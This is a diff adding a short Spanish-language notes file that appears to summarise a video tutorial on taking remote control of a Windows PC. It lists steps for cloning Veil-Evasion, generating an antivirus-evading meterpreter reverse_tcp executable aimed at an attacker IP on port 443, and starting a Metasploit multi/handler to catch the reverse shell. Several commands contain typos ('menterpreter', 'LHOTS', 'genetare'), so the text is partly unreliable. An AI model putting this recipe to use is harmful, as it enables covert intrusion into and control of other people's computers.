@@ -1,0 +1,17 @@
+Metasploit + Veil-Evasion - Controlar un pc remoto
+
+https://www.youtube.com/watch?v=vU5L9h0kc3s
+
+1. git clone https://github.com/Veil-Framework/Veil-Evasion.git #Descargar Evil Evasion 
+2. ./Evail- #ejecutar evil evasion y ver lista de payload disponibles
+3. 5 menterpreter/rev_tcp
+4. set LHOTS 192.168.2.102 #hacer su configuracion con la ip del atacante
+5. set LPORT 443
+6. genetare 
+7. nombreejecutable #una vez generado el nombreejecutable.exe lo buscamos en su ruta compile
+8. msfconsole  #ejecuto metaexplouit par ponerlo en escucha
+9. use exploit/multi/handler
+10. set PAYLOAD windows/menterpreter/reverse_tcp
+11. set LHOST 192.168.2.102 #ip atacante
+12. set LPORT 443 # puerto de escucha
+13. exploit #corro el exploit
